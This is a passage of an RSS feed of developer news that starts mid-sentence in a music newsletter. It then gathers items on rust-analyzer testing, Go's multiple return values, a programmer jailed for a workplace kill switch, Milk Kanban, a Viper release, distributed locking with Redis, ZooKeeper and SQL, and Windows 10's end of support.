most musical changes and still find success. While there are artists, like Elton John and The Rolling Stones, who put out hits for decades, I want to point out one artist whose resilience still shocks me: Frankie Valli. Born in 1934, Valli had his first major hit in 1962 with “Sherry,” a song performed with his group The Four Seasons. Before The Beatles splashed on American shores, Valli and his bandmates had eight more top 40 hits. But they were the kind of group that you’d expect to be decimated by the new sound of rock music. The Four Seasons were sort of a throwback even in 1963, Valli and his falsetto pointing toward the doo-wop of the last decade.But Valli and his collaborators forged on. They made some musical missteps but they remained a musical force through 1967, releasing bonafide classics, like “Can’t Take My Eyes Off You.” Okay. So, he survived the British Invasion. Some others did too. But Valli didn’t go quietly as the 1960s came to a close. In 1974, he scored a massive hit with “My Eyes Adored You,” a song that played well with the soft rock that was dominant at the time. Then disco began to boom and Valli remained undeterred. “Swearin' to God.” “Who Loves You.” “December, 1963 (Oh, What a Night).” The man could not be stopped.A New OneAlligator Bites Never Heal An Old OneAs I was admiring 1964, I noticed that the week of October 10 had a mind-blowing top five. It included Roy Orbison’s “Oh, Pretty Woman,” Manfred Mann’s “Do Wah Diddy Diddy,” Martha & the Vandellas’ “Dancing in the Street,” and The Shangri-Las’ “Remember (Walkin’ in the Sand).” There was one song that I wasn’t familiar with, though: “Bread and Butter” by The Newbeats.“Bread and Butter” is fun, little novelty about bread, butter, toast, jam, and losing your lover. The most notable thing about the song is a half-screamed falsetto that appears periodically throughout the song as performed by Larry Henley. Incidentally, Henley is another good example of musical resilience. After his performing career ended, he wrote a few hits over the decades, including Bette Midler’s massive 1989 ballad “Wind Beneath My Wings.”Shout out to the paid subscribers who allow this newsletter to exist. Along with getting access to our entire archive, subscribers unlock biweekly interviews with people driving the music industry, monthly round-ups of the most important stories in music, and priority when submitting questions for our mailbag. Consider becoming a paid subscriber today!Want to hear the music that I make? ]]></content:encoded></item><item><title>Testing PostMarketOS On MS Surface GO 2</title><link>https://lemmy.ca/post/40708674</link><author>/u/giannidunk</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 16:25:27 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Testing Generic x86 edge PostMarketOS with gnome on my MS Surface GO. It's the best linux experience I have had on it. I want to test plasma mobile next.]]></content:encoded></item><item><title>call for testing: rust-analyzer!</title><link>https://www.reddit.com/r/rust/comments/1jbyunp/call_for_testing_rustanalyzer/</link><author>/u/thramp</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sat, 15 Mar 2025 16:24:53 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[Hi folks! We've landed two big changes in rust-analyzer this past week: - A Salsa upgrade. Today, this should  improve performance, but in the near future, the new Salsa will allow us do features like parallel autocomplete and persistent caches. This work also unblocks us from using the Rust compiler's new trait solver! - Salsa-ification of the crate graph, which changed the unit of incrementality to an individual crate from the entire crate graph. This finer-grained incrementality means that actions that'd previously invalidate the entire crate graph (such as adding/removing a dependency or editing a build script/proc macro) will now cause rust-analyzer to  reindex the changed crate(s),  the entire workspace.While we're pretty darn confident in these changes, these are big changes, so we'd appriciate some testing from y'all!If you're using Visual Studio Code: 1. Open the "Extensions" view () on a Mac;  on other platforms. 2. Find and open the "rust-analyzer extension". 3. Assuming it is installed, and click the button that says "Switch to Pre-Release Version". VS Code should install a nightly rust-analyzer and prompt you to reload extensions. 4. Let us know if anything's off!Other Editors/Building From Source(Note that rust-analyzer compiles on the latest stable Rust! You do not need a nightly.)git clone https://github.com/rust-lang/rust-analyzer.git. Make sure you're on the latest commit!cargo xtask install --server --jemalloc. This will build and place rust-analyzer into into ~/.cargo/bin/rust-analyzer.Update your your editor to point to that new path. in VS Code, the setting is rust-analyzer.server.path, other editors have some way to override the path. Be sure to point your editor at the  path of ~/.cargo/bin/rust-analyzer!Restart your editor to make sure it got this configuration change and let us know if anything's off!]]></content:encoded></item><item><title>Were multiple return values Go&apos;s biggest mistake?</title><link>https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/</link><author>/u/SophisticatedAdults</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 16:07:14 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[tl;dr: ‘Multiple return values’ in Go interact poorly with other language features. We should probably
                promote them to full-blown tuple types.
              All of this is normal. Sickos like me  discussing perceived shortcomings of programming
              languages. It’s nothing personal. I like Go, even, despite its shortcomings.
            
              My personal candidate for Go’s  historical mistake is that of multiple return values,
              exactly because of how harmless they look.
              Multiple return values influenced the design of the language (in bad ways), interact poorly with other
              features, and make the language much more complex than it has to be.
            Exhibit A, multiple return values:Looking at this, you’d be forgiven for thinking that Go has ’tuples’ (like Python or Rust).
              It doesn’t. There’s no such thing as a ’tuple’. All Go has is a special case syntax which allows functions
              to return multiple values at the same time. If you want something that sort of behaves like a tuple in Go,
              you need to define a struct.
              There’s a few other cases of this ‘multiple return values’ behavior special cased for the built-in
               operator or when accessing a value from a map or channel.
            
              What I’m complaining about in this screed is that—as a consequence of putting multiple return values into
              the language and not making them a dedicated tuple type—Go is in a worse state than it had to be, and that
              all of this was completely avoidable.
            
              When I use other languages, I tend to be  that whatever one of my functions spits
              out, I can put it into a list or vector.
            
              Through the power of Go, it’s impossible to  pass data around without additional ceremony. I
              can’t overstate how  it is that in the world of Go, calling a function and being able to
              store the result in a list is the exception, and not the rule.
            
              This (of course) doesn’t compile since  is not a type. Tuples don’t exist. So
              you  get used to first refactoring all of your functions and defining a whole new struct
              just to pass some data around. Maybe use two lists? Or a new struct? Amazing.
            This gets significantly more annoying once you try to go concurrent.
              Imagine that you want to spin up some goroutines, have each call
              func doStuff() (string, error), and then gather the results. You  pass
               through a channel since it’s not a standalone type. The usual workaround is
              to do
              whatever this is
              or to
              define a custom struct:
            
              Let me repeat this: Go—a language famous for its concurrency and uncompromising errors-as-values
              approach—requires you to define a non-standard wrapper type to handle errors as soon as its most basic
              synchronization primitive is involved or to store  in a slice.
            In other words, Go’s error handling and concurrency don’t compose.Hell, even Go’s built-in containers and error handling don’t compose!
              Like many of Go’s problems, it’s something you can work around, but I don’t think that that’s much of an
              excuse.
            
              The whole idea behind Go’s error handling is that . You can pass them around
              like values, inspect them like values, and they’re handled using the same control flow constructs as
              everything else.
            
              So despite errors being values, the return of a function call is  not a value at all.
              You can’t pass it around, you can’t store it.
            
              A friend of mine has suggested that he believes that “Rob Pike invented Go as a practical joke.”. That’s a
              pretty rough way too put it, but I can’t entirely blame him? Why would you design a language where the
              result of a function call cannot be stored or passed around?
            
              The problem is that this situation was avoidable—if anyone had thought about this in slightly more detail
              back in the earliest design days—it would’ve been easy to just promote multiple return values to anonymous
              structs. Instead that time was, presumably, spent adding nonsense like
              named return values.
            
              This is about . Nothing is ‘simple’ about the fact that calling a function doesn’t
              return a value. It’s a weird idiosyncrasy. By trying to make the language ‘simple’, you played yourself
              and added a weird edge case.
            Iterators and ‘Range over Functions’Here’s a basic example of ranging over functions:
              Just create a constructor function which returns a function which captures variables from the enclosing
              function scope, and uses them to decide when to call its argument function, thereby determining the
              behavior of the loop for the end-user. Nothing could possibly be easier. (That’s sarcasm. I find this code
              hard to read and would’ve preferred an interface-based approach.)
            The Go standard library defines the following types and functions as part of this release:
              Go cannot handle the case of iterating over one or two values in a uniform, parametrized way. It requires
              , one for handling one value at a time, and one for two values.
            
              Because Go doesn’t have ’tuples’. Why doesn’t Go have tuples? I don’t know—There were
              some vague discussions in 2009, but it just looks like the Go developers didn’t think of the feature as particularly important. Keeping
              the language ‘small’ was the higher priority for them.
            
              Again: This was an attempt to keep the language ‘simple’ which
              now results in weird, complex edge cases and having to learn twice as many APIs. Congratulations,
              you tried to simplify and instead just played yourself.
            
              (Back in the day Go didn’t have generics. Designing a language that interacts poorly with generics under
              the assumption they’ll never be added was a design tradeoff that probably made sense at the time. Funfact:
              Go took 5 years until it’s 1.0 release. Rust needed 9 years, and Zig still isn’t there.)
            
              Take a step back to think about what this means: The designers of the standard library are forced to
              hardcode specific instances of a type because the language is unable to sufficiently abstract over whether
              you’re handling one or two values at a time.
            
              Again: This is not a hard technical problem. There  solutions for this. It’s not even hard if
              you design a language from the get-go. Go just didn’t implement them.
            
              Consider what this means for Go’s library ecosystem. If even the standard library easily runs into
              situations where it’s necessary to work around this limitation, how hard do you think it is a
              library that does anything slightly fancier? (Again, this limitation extends to error handling, since
              error handling happens through multiple return values.)
            Warning: Hot opinions ahead, and a bunch of speculation.
              Go’s multiple return value-based error handling was considered to be “good enough”, and prevented the
              development of a better approach to error handling.
            
              In reality that could’ve gone either way: The Go developers considered enums and or-operators to be such
              mysterious, advanced features that there’s no guarantees Go would have ended up with
              -type based error handling even if multiple return values had never made it into the
              language.
            For all we know we’d have “Go with exceptions”, which would probably be a step backwards.
              Still: I’ll stand by the fact that multiple return values were a classic ‘worse is better’-type solution
              that prevented the Go developers from ever  anything even slightly more nuanced,
              like a
              Result type (aka a sum
              type purely for error handling, i.e. a value which is either a result  an error).
            
              Instead, we’re stuck with multiple return values-based error handling. I’m sure you’ve seen people
              complain about the issues with accidental shadowing of variables. Those make it pretty easy to
              accidentally forget to check errors. Not a big deal but (once again, this is a running theme here)
              entirely unnecessary.
            
              Or taking an example from
              here, that code like this compiles:
            Or the fact that, no, there’s nothing that stops you from writing functions like this here:Is this bad? Well, it’s by design.
              I am not saying Go’s error handling is . It’s okay. It’s decisively mid-tier, which is a
              bit embarrassing for a modern green-field project. They had an opportunity to do better than this, and
              they blew it, and  of these issues are downstream of the decision to standardize on
              multiple return values as the idiomatic way to handle errors.
            
              I’ll put my own take on what Go’s error handling should have been like in here since it’s my blog post and
              you cannot stop me. I’m sure some people will heavily disagree. That’s fine. I think that if Go had
              standardized around this approach to error handling everyone would’ve gotten used to it.
            
              Simple, just define a  type that has a  method or operator
              defined on it that either just passes the value or (if an error is present) wraps it and
              returns from the function.
              You can bikeshed the hell out of this one. Make it a postfix operator instead of a method, if you want.
              Write  or  to make it stand out more, I don’t care.
            Vastly better interactions with generics.
                Allows you to store  in slices and pass it around however you please.
              Better for static analysis.Less verbose, if you care about that. (I honestly don’t.)There’s not even a need for sum types if you don’t want them.
              In practice, it’s too late for invasive changes like that: Go has standardized on multiple return values
              for error handling, and trying to move away from that would be a fool’s errand.
            
              Since trying to move towards sum-type-based error handling is a nonstarter unless we want to split the
              language, let’s ask the obvious question: Is there anything that can be done to improve any of the issues
              outlined in this post?
            Can we at least promote multiple return values to full blown types and allow generics over them?Maybe. That’d be cool. I think it’d be an improvement.
              It’s not entirely trivial though, so let me write down some reasons why it’d be hard, and the changes
              that’d have to be made.
            
              You might say “But doesn’t Go have strong backwards compatibility guarantees?” Yeah, it does. That’s what
              makes it hard. If you could just change stuff however you want, it’d be easy.
            
              That said, even Go 1.22 made a pretty
              significant change. You can get pretty far as long as you’re willing to say “Old code will continue to
              mean exactly what it means today: the fix only applies to new or updated code.”,  you provide
              tools to auto-fix code during a migration from Go 1.N to Go 1.(N+1).
            In other words, it doesn’t sound impossible.
              In Go, multiple return values are ‘unpacked’ via . This makes the following
              code syntactically ambiguous due to the optional presence value you can extract from maps:
            
              Is this a problem? Eeeeh. It looks like one, but it’s to resolve by just picking one. Since tuples don’t
              exist in previous versions of Go, old code is just not affected.
            Multiple Return Value passingPassing multiple return values to a variadic function is currently legal Go code:
              Does this pass the tuple  to bar as the first argument, or does it automatically unpack
               to pass the fields as first and second argument?
            
              Moving away from auto-unpacking would be a breaking change, but if we don’t move away from it then
              .
            
              The modern solution to that is pretty simple: First, allow tuples to be unpacked like slices are (i.e. you
              have to write  to unpack the tuple). Second, add  and
               commands that identify this issue and fix it when upgrading to the most recent edition
              of Go.
            
              Honestly? I thought this would be hard, but as far as language changes go, this seems pretty easy, all
              things considered.
            
              If you want to dig deeper into this, you can find
              a bunch of
              similar Github
              issues on these topics. I stumbled
              upon them when doing research for this blog, I’ve not participated in any of them.
            Maybe I should, though. It would be  to see this one issue finally resolved.
              I don’t know for sure how Go ended up in this weird state with ‘multiple return values’, where it’s
              impossible to pass function results through a channel or into a slice.
            That one is still baffling to me, so here’s me trying to make sense of it.
              My understanding is that multiple return values were part of Go before its public release. Even in the
              Weekly Snapshot History that goes all the
              way back to 2009, there’s only a single mention of multiple return values way back in 2010: “cgo: correct
              multiple return value function invocations (thanks Christian Himpel)”.I imagine the situation played out as follows:
              First of all, multiple return values entered the language . Perhaps via the
               operator, since someone figured that using a traditional
              for (int i = 0; i < 100; i++)-style loop just to iterate over the elements of an array or
              map is too error prone, or perhaps just as a convenience feature.
            
              Then, the gates of hell opened, demons attacked and the world of programming was set back—no, sorry, I am
              kidding.
            
              I assume that what actually happened is that multiple return values were just  and
              quickly became the idiomatic ‘gold-standard’ for error handling, passing values around, and so on.
            
              At this point I’m sure that someone asked “Hey, why don’t we just promote those to a full-blown tuple
              type?”, and was shot down with something like “We already have . There should be a
              single way of doing things. Go is a simple language. Why would we want to have two features that do the
              same thing?”
            
              In either case, at this point multiple return values were here to stay, and the feature established itself
              as the standard for error handling.
            
              Looking at the oldest internal discussions in Google’s ‘Golang Nuts’ group (just one or three days after
              the first
              announcement)
              is interesting. Say
              here or
              here. I
              mean it! Go and take a look. Lines such as “Go doesn’t have nullable types, we haven’t seen a lot of
              demand for them” really puts things into perspective.
            
              Give it a few years and we enter the present day, and Go is struggling with some of its earliest design
              decisions. (Evidence: This entire post. Also,
              generic methods are still
              impossible.)
            
              Go has these weird special cases (e.g. multiple return values, named return values), decided that ‘and’
              and ‘or’ are close enough (they even made that mistake twice), and many of these problems were intentional design decisions or avoidable.
            
              The ‘avoidable’ part is a big deal for me. It just feels like a lot of pain could’ve been avoided if Go
              had spent slightly more time thinking about programming language design.
            
              Going out on a limb, to me it looks like many of the issues boil down to the question of whether you take
              types seriously, and are willing to dig into the bare minimum of abstractions to figure out how certain
              features need to be designed, instead of just making things up as you ™.
            
              I don’t want to shill for Rust , but one thing that language did well is that it
               and designed itself around its type system.
             is how it got memory safety without a garbage collector. By
              moving that information to the type system. This is exactly, intentionally the road that Go
              didn’t pick.
            
              Go instead got…multiple return values, which are specifically, intentionally
              not a type in their own right to keep the language simple. I think this was a bad decision. When
              it’s easy to codify an abstraction as a type, you  codify it as a type. Go is still
              learning that lesson today.
            
              To go out on a positive note—I just spent a whole post complaining about Go, after all—I think that Go is
              an impressive technical achievement, and set the modern gold standard as far as tooling goes. I am
              grateful for that. I also really have to respect that its simplicity keeps perfectionism at bay.
            
              Someday I want to write a post about what I like about Go, but that day is not today. I’ll cross my
              fingers that tuples are going to be on the list by then.
            ]]></content:encoded></item><item><title>This is what Rust was meant for, right?</title><link>https://github.com/giacomo-b/rust-stakeholder</link><author>/u/jackraddit</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sat, 15 Mar 2025 16:00:22 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Fired “Kill Switch” Programmer Faces 10 Years In Jail: What Went Wrong?</title><link>https://programmers.fyi/fired-kill-switch-programmer-faces-10-years-in-jail-what-went-wrong</link><author>/u/derjanni</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 15:52:47 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[The 55 year old Texan Davis Lu was just sentenced to 10 years in jail for pulling a “kill switch” on his employer EATON Corporation where he was employed as a Senior Software Developer for Emerging Technologies . Davis build apps that would regularly execute a method called “IsDLEnabledinAD” which stands for “Is Davis Lu enabled in Active Directory”. Once that method failed, his apps would wreak havoc on the systems of his employer.When Davis Lu was laid off on September 9th, 2019 his “secret server” in Kentucky started to administer his evil plans. It reaked havoc when his account was removed from the company’s Active Directory. His hidden server housed dozens of Java apps, some going by the name of “Hakai” 破壊 (Japanese for “destruction”) and “Hūnshuì” 昏睡 . Lu’s fellow coworkers found the kill switch after his termination when the apps already interrupted thousands of company users and systems causing severe financial damage to his former employer.“Sadly, Davis Lu used his education, experience, and skill to purposely harm and hinder not only his employer and their ability to safely conduct business, but also stifle thousands of users worldwide,” — FBI Special Agent, Greg Nelsen]]></content:encoded></item><item><title>Is there a Nodejs library you wish existed for Golang?</title><link>https://www.reddit.com/r/golang/comments/1jby40e/is_there_a_nodejs_library_you_wish_existed_for/</link><author>/u/prisencotech</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 15:51:41 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[People often cite the availability of third party libraries for Node as the reason to prefer it over Golang. Has anyone run into a time when they had to use Node or made do without because a third party library didn't exist?   submitted by    /u/prisencotech ]]></content:encoded></item><item><title>Show HN: A personal YouTube frontend based on yt-dlp</title><link>https://github.com/christian-fei/my-yt</link><author>modmodmod</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 15:45:42 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Show HN: Fashion Shopping with Nearest Neighbors</title><link>https://vibewall.shop/</link><author>unixpickle</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 15:33:21 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[An error has occurred while loading the content.]]></content:encoded></item><item><title>Milk Kanban</title><link>https://brodzinski.com/2025/03/milk-kanban.html</link><author>ladronevincet</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 15:32:02 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[When people say Kanban, they tend to think of a specific set of practices. Whiteboards & sticky notes (both almost universally virtual). Tasks moving through columns that represent workflow. Every now and then, WIP limits even.As often as we do it with other things, it reduces a broader principle to a set of oversimplified techniques, which, in turn, tend to underdeliver in many contexts.In its original meaning, Kanban represented a visual signal. The thing that communicated, well, something. It might have been a need, option, availability, capacity, request, etc.In our Kanban systems, the actual Kanban is a sticky note.It represents work, and given its closest environment (board, columns, other stickies, visual decorators), it communicates what needs, or needs not, to be done.If it’s yellow, it’s a regular feature. If there’s a blocker on it, it requests focus. If there’s a long queue of neighbors, it suggests flow inefficiency. If it’s a column named “ready for…” it communicates available work and/or handoff.A visual signal all the way.Let’s decouple ourselves from the most standard Kanban board design. Let’s forget columns, sticky notes, and all that jazz.Enters Kasia, our office manager at Lunar. One of the many things Kasia takes care of is making sure we don’t run out of kitchen supplies. The tricky part is that when you don’t drink milk yourself, it becomes a pain to check the cupboard with milk reserves every now and then to ensure we’re stocked.Then, one day, I found this.A simple index card taped to the last milk carton in a row stating, “Bring me to Kasia.” That’s it.In the context, it really says that:we’re running out of (specific kind of) milkthere’s enough time to make an order (we don’t drink that much of cappuccinos and macchiatos)But it’s just a visual signal. Kanban at its very core.What Kasia designed is a perfect Kanban system. It relies on visual signals, which are put in the context. Even better, unlike most Kanban boards I see across teams, the system is self-explanatory. Everything one needs to know is written on the index card.It’s a safe assumption that, almost always, there’s a simpler visualization that would work just as well. We, process designers, often fall into the trap of overengineering our tools.And it’s a healthy wake-up call when someone who knows close to nothing about our fancy stuff designs a system that we would unlikely think of. One that is a perfect implementation of the original spirit, even if it doesn’t follow any of the common techniques.That’s what we can learn from Milk Kanban.]]></content:encoded></item><item><title>New Viper release with major improvements</title><link>https://www.reddit.com/r/golang/comments/1jbx8d6/new_viper_release_with_major_improvements/</link><author>/u/sagikazarmark</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 15:11:55 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[It comes with a number of improvements:Heavily reduced number of third-party dependenciesNew encoding layer for custom encoding formatsBREAKING: dropped HCL, INI and Java properties from the core (still possible to use through external libraries)New file search API allows customizing how Viper looks for config filesThese features has been around for some time in alpha releases, though I haven't received a lot of feedback, so I'm posting here now in the hope that people using Viper will give some after upgrading.I worked hard to minimize breaking changes, but it's possible some slipped in. If you find any, feel free to open an issue.]]></content:encoded></item><item><title>Distributed Locking: A Practical Guide</title><link>https://www.architecture-weekly.com/p/distributed-locking-a-practical-guide</link><author>/u/Adventurous-Salt8514</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 15:10:23 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Was your data ever mysteriously overwritten? No? Think again. Have you noticed conflicting updates to the same data?In distributed systems, coordination is crucial. A distributed lock ensures that if one actor (node, service instance, etc.) changes a shared resource—like a database record, file, or external service—no other node can step in until the first node is finished.Today, we’ll try to discuss it and:By the end, you should have a decent grasp of distributed locks, enough to make informed decisions about whether (and how) to use them in your architecture.who’s in charge of updating shared data?For example, you might have:Multiple Writers are updating the same table row.That’s a common issue when updating read models.Without locks, you can get unpredictable states - like a read model flipping from correct to incorrect or a file partially overwritten by multiple workers. Locks sacrifice a bit of parallelism for the certainty that no two nodes update the same resource simultaneously. In many cases, that’s the safest trade-off, especially if data correctness is paramount.idempotent actionswrite-ahead logsIf no lock currently exists, the node creates one, for instance by setting a Redis key with a time-to-live or by creating an ephemeral zNode in ZooKeeper.If another node is holding the lock, this node either waits, fails immediately, or retries, depending on your chosen policy.Crash or Automatic ReleaseThe basic flow would look like:And the acquisition part with TTL handling:There are many tools for distributed locking; let's check the most popular for certain categories.Kubernetes Single-InstanceDistributed locks all share a common goal: ensure only one node does a particular thing at any given time. However, each tool mentioned approaches the problem with distinct designs, strengths, and failover behaviours.Let’s look at each tool’s big-picture purpose—why you’d even consider it—then move on to how it implements (or approximates) a lock. Lastly, let’s discuss a few technical details that matter once you start coding or troubleshooting.Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through.Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through. To create a lock, you need to create a “lock key” using a Redis command, for instance:SET lockKey node123 NX EX 30That looks cryptic, but let’s see what’s happening behind the scenes:Atomic Key Creation with NX. SET lockKey node123 NX EX 30SET lockKey node123 NX EX 30Handling Network Partitions. Redlock algorithmChoosing Redis may be a good option if you already run a Redis cluster for caching or need a lightweight solution that’s easy to integrate. Performance is generally good, though absolute consistency under partitions can require more complex setups.ZooKeeper and etcd each run as a cluster of nodes that keep data consistent across a majority of them (a quorum).You create something like  in ZooKeeper or a key in etcd.When you’re done, you delete the ephemeral node or lease key, signalling that source is available.Other clients can “watch” that lock path. If the lock holder crashes, ZooKeeper or etcd detects the session loss and removes the node, instantly notifying watchers that the lock is free again. This allows any waiting client to move in and grab the lock right away.If a node is isolated from the quorum, ZooKeeper or etcd eventually considers that session dead and removes the ephemeral node. This auto-frees the lock. The newly updated cluster state reflects that the lock is available, so another node can pick it up.If your environment already depends on them for cluster metadata or leader election, reusing them for locks is natural. They replicate data across multiple servers, so updates to the lock state are consistent, reducing the risk of split-brain scenarios. The ephemeral mechanism automatically frees locks if a session dies, so you don’t end up with “zombie” locks after crashes.They offer stronger consistency guarantees at the cost of heavier operational overhead compared to Redis.Sometimes you’d rather avoid setting up additional infrastructure, like Redis or ZooKeeper, and simply rely on the single relational database you already use. Many SQL databases—PostgreSQL, MySQL, SQL Server, and others—provide built-in locking features that can help you coordinate concurrency directly in your existing environment. There are generally two ways to handle locks in a relational database: “I want exclusive access to something”They serve different needs, but both let you say, “I want exclusive access to something,” using your existing DB.You can lock specific rows in a table by issuing something like:BEGIN;
SELECT * FROM locks WHERE lock_id = @loc_key FOR UPDATE;
/* make changes */
COMMIT;
That looks cryptic, but here’s what’s happening. “Lock this row so nobody else can modify it until I’m done.”The lock lasts until you commit or roll back the transaction.You may also use regular rows instead of a dedicated locks table. It’s natural if your concurrency problem revolves around specific table rows. For others you need to define key that would represent the scope of locking-- PostgreSQL
SELECT pg_advisory_lock(12345);
/* do something exclusive */
SELECT pg_advisory_unlock(12345);
-- MySQL
SELECT GET_LOCK('readModel', 10);
/* do something exclusive */
SELECT RELEASE_LOCK('readModel');
PostgreSQL Advisory LocksIn many cases, database locks require minimal setup. There’s no need to spin up Redis or ZooKeeper if you already trust a single relational DB for everything. You can use familiar SQL, which can benefit many developers. You get transaction integrations.Still, they’re tight to a single database scope.The other downside is lock contention.You also can get deadlocksSometimes, you don’t need a distributed lock at all—you just need to ensure there’s no possibility of concurrency. In Kubernetes, you can tell the cluster to run exactly one replica of your service. With only one pod, you don’t risk two pods writing to the same resource simultaneously. This approach is straightforward but also very limiting.StatefulSetNo Parallelism or scalingetcdetcdIn Kubernetes, the mechanisms and controllers designed to manage the number of pods are quite robust, but in highly dynamic or unusual situations, there might be brief moments where conditions could lead to more than one pod being created temporarily.Rapid Scale-Up and Scale-Down:Network Partitions or etcd Availability Issues:Why You’d Choose Single-Instance in Kubernetes?If you just need to enforce that there’s a single instance processing background job (read model handling, job processing) and you have Kubernetes set up, then it’s a decent choice. You remove the concurrency at all. You don’t spin up Redis or ZooKeeper just to handle locks.Still, the race conditions can be dangerous for high traffic or important cases. It’s not fully reliable.Here’s my recommended decision-making scheme for locking mechanism:If you have a single relational DB handling all app state, advisory locks might sufficeIf your environment already includes a Redis cluster for caching and you want a simpler ephemeral lock, Redis is a natural fit.If concurrency is never desired or is completely out of scope for a specific microservice, AND you’re using already Kubernetes a single-instance Kubernetes approach may be acceptable.If your microservices need advanced coordination (like leader election, watchers, or strongly consistent state), consider ZooKeeper or etcd. If your system needs to acquire multiple locks at once, you risk deadlocks (e.g., process A has Lock1 and wants Lock2; process B has Lock2 and wants Lock1). The best practice is to lock in a consistent order globally or use carefully designed transaction boundaries. I’ll show you next week how you could use queuing and single writer for that.Locks serialize access. If too many services fight for the same lock, your system effectively becomes single-threaded. To avoid bottlenecks, lock only the smallest critical sections. If concurrency at some granularity is acceptable, consider sharding or partitioned locks.If you rely on a single Redis instance or a single ZooKeeper node, your lock manager can fail. Always consider using a clustered or highly available setup, such as Redis with sentinel or cluster mode or a ZooKeeper ensemble of three or five nodes.Systems like Redlock try to handle partial failures, but no distributed lock can be 100% guaranteed if your network is severely partitioned (CAP theorem territory). You might end up with multiple holders, each believing they’re the only one. Proper design, timeouts, and conflict detection help reduce these edge cases.Try to avoid distributed locking if you can. Distributed systems will always have complexities, but a well-implemented distributed lock (or a strategic single-instance approach) can tame the chaos of concurrency—keeping your data consistent and your architecture stable.What are your experiences, use cases, and challenges with distributed locking?And hey, all the best for Christmas if you celebrate it. If you don’t, try to also get the chance to rest a bit. And if you  don’t want to, that’s fine, as long as you’re happy!p.s. Ukraine is still under brutal Russian invasion. A lot of Ukrainian people are hurt, without shelter and need help.Ukraine humanitarian Ambulances for UkraineRed Cross]]></content:encoded></item><item><title>End of Windows 10 Leaves PC Charities With Tough Choice</title><link>https://tech.slashdot.org/story/25/03/15/016220/end-of-windows-10-leaves-pc-charities-with-tough-choice?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>BeauHD</author><category>dev</category><category>slashdot</category><pubDate>Sat, 15 Mar 2025 02:00:00 +0000</pubDate><source url="https://linux.slashdot.org/">Dev - Slashdot - Linux</source><content:encoded><![CDATA[With Microsoft ending free security updates for Windows 10 in October, millions of PCs that don't meet Windows 11's hardware requirements face an uncertain fate... Charities that refurbish and distribute computers to low-income individuals must choose between providing soon-to-be-insecure Windows 10 machines, transitioning to Linux -- despite usability challenges for non-tech-savvy users -- or recycling the hardware, contributing to ewaste. Tom's Hardware reports: So how bad will it really be to run an end-of-lifed Windows 10? Should people worry? [Chester Wisniewski, who serves as Director and Global Field CISO for Sophos, a major security services company] and other experts I talked to are unequivocal. You're at risk. "To put this in perspective, today [the day we talked] was Patch Tuesday," he said. "There were 57 vulnerabilities, 6 of which have already been abused by criminals before the fixes were available. There were also 57 in February and 159 in January. Windows 10 and Windows 11 largely have a shared codebase, meaning most, if not all, vulnerabilities each month are exploitable on both OSs. These will be actively turned into digital weapons by criminals and nation-states alike and Windows 10 users will be somewhat defenseless against them."
 
So, in short, even though Windows 10 has been around since 2015, there are still massive security holes being patched. Even within the past few weeks, dozens of vulnerabilities were fixed by Microsoft. So what's a charity to do when these updates are running out and clients will be left vulnerable? "What we decided to do is one year ahead of the cutoff, we discontinued Windows 10," said Casey Sorensen, CEO of PCs for People, one of the U.S.'s largest non-profit computer refurbishers. "We will distribute Linux laptops that are 6th or 7th gen. If we distribute a Windows laptop, it will be 8th gen or newer." Sorensen said that any PC that's fifth gen or older will be sent to an ewaste recycler.
 
